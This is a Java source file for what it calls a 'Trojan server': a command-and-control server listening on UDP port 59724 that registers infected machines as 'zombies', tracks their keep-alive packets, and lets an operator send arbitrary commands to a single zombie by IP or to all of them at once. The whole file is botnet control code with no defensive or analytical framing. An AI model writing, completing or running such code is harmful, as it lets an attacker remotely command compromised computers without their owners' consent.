import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map.Entry;
import java.util.Scanner;
import java.util.Timer;

public class ServeurAuth
{
    static boolean restarting, count = true;
    final static int port = 59724, CHECK_ALIVE = 5000, TIME_OUT_ALIVE = 3; // 59722 for Admin Sys and 59723 for any user and 59724 for others
    static byte buffer[] = new byte[100000000];
    static String path = new File("").getAbsolutePath() + File.separatorChar, zombiesPath = path + "zombies" + File.separatorChar;
    static File log = new File(path + "Log" + File.separatorChar + "Log.log"), logZB = new File(path + "Log" + File.separatorChar + "LogZB.log"), logZBA = new File(path + "Log" + File.separatorChar + "LogZBA.log"), zombies = new File(zombiesPath);
    static HashMap<String, HashMap<InetAddress, Integer>> zombiesList = new HashMap<String, HashMap<InetAddress, Integer>>();
    static HashMap<String, Integer> aliveList = new HashMap<String, Integer>();
    static DatagramSocket socket;

    public static <ProcessBuild> void main(String args[])
    {
        String startMsg = "Launching Trojan server on port: " + port;
        log.getParentFile().mkdirs();
        read(startMsg);
        writeZBA(startMsg);

        zombies.mkdirs();

        try
        {
            for(File file : zombies.listFiles())
            {
                FileWriter fw = new FileWriter(file, false);
                fw.write("0");
                fw.close();
            }
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }

        Thread inputThread = new Thread()
        {
            @Override
            public void run()
            {
                try
                {
                    Scanner scanner = new Scanner(System.in);
                    while(scanner.hasNextLine())
                    {
                        String command = scanner.nextLine();
                        read("Command entered: " + command);
                        if(command.startsWith("count "))
                        {
                            if(command.equalsIgnoreCase("count get"))
                                read("Zombies list: " + zombiesList.size());
                            else if(command.equalsIgnoreCase("count status"))
                                read("Count status: " + count);
                            else
                                read("Command not understood.");
                        }
                        else if(command.equalsIgnoreCase("displayZombies"))
                        {
                            int len = zombiesList.size();
                            if(len == 0)
                                read("No zombie available.");
                            Iterator<String> iterator = zombiesList.keySet().iterator();
                            read("There are " + zombiesList.size() + " zombies:");
                            int i = 0;
                            while(iterator.hasNext())
                            {
                                read("[" + i + "] " + iterator.next());
                                i++;
                            }
                        }
                        else if(command.startsWith("applyAll "))
                        {
                            String[] parts = command.split(" ");
                            if(parts.length < 2)
                            {
                                read("Command hasn't been treated, usage: applyAll windowsCode");
                                continue;
                            }
                            Iterator<HashMap<InetAddress, Integer>> it = zombiesList.values().iterator();
                            String msg = parts[1];
                            for(int i = 2; i < parts.length; i++)
                                msg += " " + parts[i];
                            while(it.hasNext())
                            {
                                HashMap<InetAddress, Integer> hashMap = it.next();
                                Entry<InetAddress, Integer> en = hashMap.entrySet().iterator().next();
                                socket.send(new DatagramPacket(msg.getBytes(), msg.length(), en.getKey(), en.getValue()));
                            }
                        }
                        else if(command.startsWith("do "))
                        {
                            String[] parts = command.split(" ");
                            if(parts.length < 2)
                            {
                                read("Command hasn't been treated, usage: do I.P.v.4 (cmd)");
                                continue;
                            }
                            String ip = parts[1], message = "";
                            for(int i = 2; i < parts.length; i++)
                                message += parts[i] + " ";
                            if(!zombiesList.containsKey(ip))
                            {
                                read(parts[1] + " isn't in the zombies system, can't proceed !");
                                continue;
                            }
                            HashMap<InetAddress, Integer> hashMap = zombiesList.get(ip);
                            Entry<InetAddress, Integer> en = hashMap.entrySet().iterator().next();
                            socket.send(new DatagramPacket(message.getBytes(), message.length(), en.getKey(), en.getValue()));
                        }
                        else if(command.equals(""))
                            read("Nothing has been written.");
                        else
                            read("Command not understood.");
                    }
                    scanner.close();
                }
                catch(Exception e)
                {
                    e.printStackTrace();
                }
            }
        };
        inputThread.start();
        Timer timer = new Timer();
        timer.schedule(new AliveChecker(), 0, CHECK_ALIVE);
        while(true)
        {
            try
            {
                socket = new DatagramSocket(port);
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
                socket.receive(packet);
                String ip = packet.getAddress().toString().replace("/", "");
                String type = "", info0 = "", packetData = new String(packet.getData(), 0, packet.getLength()), parts[] = packetData.split(" ");
                if(parts.length >= 1)
                {
                    type = parts[0];
                    if(parts.length >= 2)
                        info0 = parts[1];
                }
                if(!info0.equals("alive"))
                    read(ip + " | Données arrivées non traitées : " + packetData);
                if(type.equals("Z"))
                {
                    if(info0.equals("connect"))
                        addZombie(packet, ip);
                    else
                    {
                        if(!zombiesList.containsKey(ip))
                            addZombie(packet, ip);
                        if(info0.equals("alive"))
                        {
                            aliveList.put(ip, 0);
                            HashMap<InetAddress, Integer> tmp = new HashMap<InetAddress, Integer>();
                            tmp.put(packet.getAddress(), packet.getPort());
                            zombiesList.put(ip, tmp);
                        }
                        else if(info0.equals("output") || info0.equals("read"))
                            writeZB("Output printed !");
                        else
                            writeZB("Packet not understood !");
                    }

                }
                socket.close();
            }
            catch(Exception e)
            {
                e.printStackTrace();
            }
        }
    }

    static void addZombie(DatagramPacket packet, String ip)
    {
        try
        {
            HashMap<InetAddress, Integer> tmp = new HashMap<InetAddress, Integer>();
            tmp.put(packet.getAddress(), packet.getPort());
            zombiesList.put(ip, tmp);
            aliveList.put(ip, 0);
            writeZB(ip + " added to the zombie list !");
            if(count)
                writeZB("Zombies list: " + zombiesList.size());
            String fPath = zombiesPath + ip + ".txt";
            File fZ = new File(fPath);
            FileWriter fw = new FileWriter(fZ, false);
            fw.write("1");
            fw.close();
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
    }

    public static void read(Object object, Object prefix)
    {
        readZB(prefix.toString() + " " + object.toString());
    }

    public static String getDate()
    {
        Calendar c = Calendar.getInstance();
        String date = c.get(Calendar.DAY_OF_MONTH) + "/" + c.get(Calendar.MONTH) + "/" + c.get(Calendar.YEAR) + " " + c.get(Calendar.HOUR) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND) + ":" + c.get(Calendar.MILLISECOND) + " ";
        if(c.get(Calendar.AM_PM) == 0)
            date += "AM";
        else
            date += "PM";
        return date;
    }

    public static void writeZB(Object object)
    {
        String messageWithDate = getDate() + " : " + object;
        writeLogZB(messageWithDate);
    }

    public static void writeZBA(Object object)
    {
        String messageWithDate = getDate() + " : " + object;
        writeLogZBA(messageWithDate);
    }

    public static void readZB(Object object)
    {
        String messageWithDate = getDate() + " : " + object;
        System.out.println(messageWithDate);
        writeLogZB(messageWithDate);
    }

    public static void read(Object object)
    {
        String messageWithDate = getDate() + " : " + object;
        writeLog(messageWithDate);
    }

    public static void writeLogZB(String message)
    {
        try
        {
            BufferedWriter out = new BufferedWriter(new FileWriter(logZB, true));
            out.write(message + "\n");
            out.flush();
            out.close();
        }
        catch(Exception e)
        {}
    }

    public static void writeLogZBA(String message)
    {
        try
        {
            BufferedWriter out = new BufferedWriter(new FileWriter(logZBA, true));
            out.write(message + "\n");
            out.flush();
            out.close();
        }
        catch(Exception e)
        {}
    }

    public static void writeLog(String message)
    {
        try
        {
            BufferedWriter out = new BufferedWriter(new FileWriter(log, true));
            out.write(message + "\n");
            out.flush();
            out.close();
        }
        catch(Exception e)
        {}
    }

    public static String needZero(int i)
    {
        String a = Integer.toString(i);
        if(i < 10)
            a = 0 + a;
        return a;
    }
}